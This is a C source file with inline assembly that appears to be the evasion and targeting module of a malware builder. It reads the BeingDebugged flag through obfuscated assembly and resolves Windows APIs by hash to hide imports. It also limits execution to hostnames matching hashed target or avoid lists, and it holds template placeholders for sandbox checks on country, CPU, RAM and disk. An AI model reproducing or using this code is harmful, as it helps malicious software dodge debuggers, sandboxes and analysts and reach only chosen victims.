#include "definitions.h"

// size_t custom_strlen(const char *str) {
//     size_t length = 0;
//     while (str[length] != '\0') {
//         length++;
//     }
//     return length;
// }

bool is_being_debugged() {
    bool beingDebugged = false;
    #ifdef _WIN64
        __asm__ (
            "mov $0xae, %%rax\n\t"
            "xor %%rdx, %%rdx\n\t"
            "xor $0xce, %%rax\n\t"
            "mov %%gs:(%%rax), %%rax\n\t"
            "inc %%rax\n\t"
            "inc %%rax\n\t"
            "mov (%%rax), %[result]\n\t"
            : [result] "=r" (beingDebugged)
            : 
            : "rax", "rdx", "memory"
        );
    #endif
    // 32 bits -> 0
    return beingDebugged;
}

const char* get_hostname(HMODULE hKernel32dll) {
    static char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    GetComputerNameFunc _GetComputerName = (GetComputerNameFunc)CustomGetProcAdress(hKernel32dll, GET_COMPUTER_NAME_HASH);
    if (_GetComputerName(computerName, &size)) {
        return computerName;
    } else {
        return "Error";
    }
}


unsigned int RO(const char* str, uint8_t rotation_value, bool is_rotation_right) {
    unsigned int hash = 0;
    size_t str_len = strlen(str);
    for (size_t i = 0; i < str_len; i++) {
        if (is_rotation_right) {
            hash = (hash >> rotation_value) | (hash << (32 - rotation_value));
        } else {
            hash = (hash << rotation_value) | (hash >> (32 - rotation_value));
        }
        hash += str[i];
    }
    return hash;
}

bool is_objhash(ObjHash obj_hash) {
    // null ObjHash is : {0, 0, false}
    return (obj_hash.value != 0 || obj_hash.rotation_value != 0 || obj_hash.is_rotation_right != false);
}

bool is_string_matching_prefixHash(const char* str, ObjHash prefix_hash) {
    bool match = true;
    size_t str_len = strlen(str);
    __asm__ (
        // "push %[string]\n\t"
        // "mov %%rsp, %%rsi\n\t"
        "mov %[string], %%rsi\n\t"
        "mov %[hash], %%r10d\n\t"
        "movzx %[is_ror], %%r8d\n\t"
        "xor %%r9d, %%r9d\n\t"
        "mov %[strlen], %%rcx\n\t"

    "hash_loop:\n\t"
        "xor %%rax, %%rax\n\t"
        "lodsb\n\t"
        "add %%eax, %%r9d\n\t"
        "push %%rcx\n\t"
        "test %%r8d, %%r8d\n\t"
        "movzx %[rotation_value], %%ecx\n\t"   
        "jz rotate_left_%=\n\t"
        "ror %%cl, %%r9d\n\t"              
        "jmp rotate_end_%=\n\t"            
    "rotate_left_%=:\n\t"
        "rol %%cl, %%r9d\n\t"              
    "rotate_end_%=:\n\t"
        "pop %%rcx\n\t"
        "cmp %%r10d, %%r9d\n\t"
        "jz matching\n\t"
        "cmp %%ah, %%al\n\t"
        "jnz hash_loop\n\t"
    "not_matching:\n\t"
        "mov $0, %[result]\n\t"
        "jmp end\n\t"
    "matching:\n\t"
        "mov $1, %[result]\n\t"
    "end:\n\t" // %
        : [result] "=r" (match)
        : [hash] "r" (prefix_hash.value), [string] "r" (str), [strlen] "r" (str_len), [rotation_value] "r" (prefix_hash.rotation_value), [is_ror] "m" (prefix_hash.is_rotation_right)                // Input
        : "rax", "rcx", "rsi", "r8", "r9", "r10", "memory"
    );
    return match;
}

bool is_valid_hostname(const char* hostname) {
    // Case 1 : TARGET set
    if (is_objhash(TARGET_HOSTNAME_PREFIX_HASH)) {
        return is_string_matching_prefixHash(hostname, TARGET_HOSTNAME_PREFIX_HASH);
    } else {
        // Case 2 : TARGET not set
        for (size_t i = 0; i < AVOIDED_HOSTNAME_PREFIX_HASHES_SIZE; i++) {
            if (is_string_matching_prefixHash(hostname, AVOIDED_HOSTNAME_PREFIX_HASHES[i])) {
                return false; // false
            }
        }
    }
    return true; // Default
}


bool is_valid_language(HMODULE hKernel32, HMODULE hUser32) {

    %SANDBOX__COUNTRY_CHECK%

    return true;
}


bool is_valid_computer(HMODULE hKernel32) {

    %SANDBOX__CPU_CHECK%

    %SANDBOX__RAM_CHECK%

    %SANDBOX__DISK_CHECK%

    return true;
}